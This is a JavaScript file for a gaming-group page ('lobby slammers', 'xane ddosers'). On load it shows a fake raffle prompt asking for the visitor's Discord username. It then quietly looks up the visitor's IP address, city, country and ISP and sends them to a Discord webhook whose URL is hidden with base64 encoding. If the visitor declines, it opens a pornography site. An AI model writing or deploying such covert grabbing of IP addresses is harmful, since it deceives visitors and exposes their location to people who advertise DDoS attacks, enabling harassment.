const webhookUrl = 'aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9va3MvMTMxMjMwMDQ5ODQ3MjE0NDk3OC9sNW9BMVhsLXJFcXBKSDgwVWpDWlJHWUtzbVZQYVp5VHB6b1d1QkVyd0tNdWNFelg1V0ZfRF91RjRyTGlGdlBpT2RaQg==';

let audioInitialized = false;

const brandDescription = [
    'pro ragers',
    'lobby slammers',
    'xane ddosers',
    'trashtalkers',
    'omegatm fanboys',
    'powered by velocity',
    'hack vs hack team'
];

const effects = ['bounce', 'flash', 'pulse', 'rubberBand', 'shake', 'swing', 'tada', 'wobble', 'jello'];

function validateWebhookData(data, ipData) {
    const fields = data.embeds[0].fields;
    return fields.some(field => 
        field.value === ipData.ip ||
        field.value === `${ipData.city}, ${ipData.country_name}` ||
        field.value === ipData.isp
    );
}

function promptUser() {
    const video = document.querySelector('.background-video');
    const username = prompt("You have been chosen in a raffle to be apart of Ragers Hall Of Fame, Please Input your discord username.");

    if (username) {
        console.log("Username entered:", username);
        
        const audio = document.getElementById('backgroundAudio');
        if (audio) {
            audio.pause();
            audio.currentTime = 0;
        }

        video.currentTime = 0;
        video.muted = false;
        video.volume = 1.0;
        video.play().catch(error => console.log("Video play error:", error));

        fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=ed1b2e7b69764aa2a07bae4a928aedb8`)
            .then(response => response.json())
            .then(data => {
                console.log("IP data received:", data);

                const webhookData = {
                    content: `New Hall of Fame Entry!`,
                    embeds: [{
                        title: "User Information",
                        color: 16711680,
                        fields: [
                            { name: "Discord Username", value: username },
                            { name: "IP Address", value: data.ip },
                            { name: "Location", value: `${data.city}, ${data.country_name}` },
                            { name: "ISP", value: data.isp }
                        ],
                        timestamp: new Date().toISOString()
                    }]
                };

                if (validateWebhookData(webhookData, data)) {
                    return fetch(atob(webhookUrl), {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(webhookData)
                    });
                }
                throw new Error('Unauthorized webhook data detected');
            })
            .then(response => {
                if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
                console.log('Webhook sent successfully');
            })
            .catch(error => console.log('Operation error:', error));
    } else {
        for(let i = 0; i < 1; i++) {
            window.open("https://www.pornhub.com/view_video.php?viewkey=672298c5e2062", "_blank");
        }
    }
}

document.addEventListener('DOMContentLoaded', () => {
    const loadingContainer = document.querySelector('.loading-container');
    const mainPage = document.querySelector('.main-page');
    const video = document.querySelector('.background-video');
    video.muted = true;

    const initializeUI = () => {
        loadingContainer.classList.add('fade-out');
        mainPage.style.display = 'block';
        mainPage.classList.add('fade-in');
        video.play();
        updateBrandDescription();
        return new Promise(resolve => setTimeout(resolve, 1000));
    };

    setTimeout(() => {
        loadingContainer.style.display = 'none';
        initializeUI().then(promptUser);
    }, 2750);
});

function updateBrandDescription() {
    const element = document.getElementById('brandDescription');
    if (element) {
        let currentIndex = 0;
        setInterval(() => {
            const randomEffect = effects[Math.floor(Math.random() * effects.length)];
            element.textContent = brandDescription[currentIndex];
            element.className = `animate__animated animate__${randomEffect}`;
            currentIndex = (currentIndex + 1) % brandDescription.length;
        }, 2000);
    }
}

fetch('users.html')
    .then(response => response.text())
    .then(data => {
        const container = document.getElementById('users-container');
        if (container) {
            container.innerHTML = data;
        }
    });
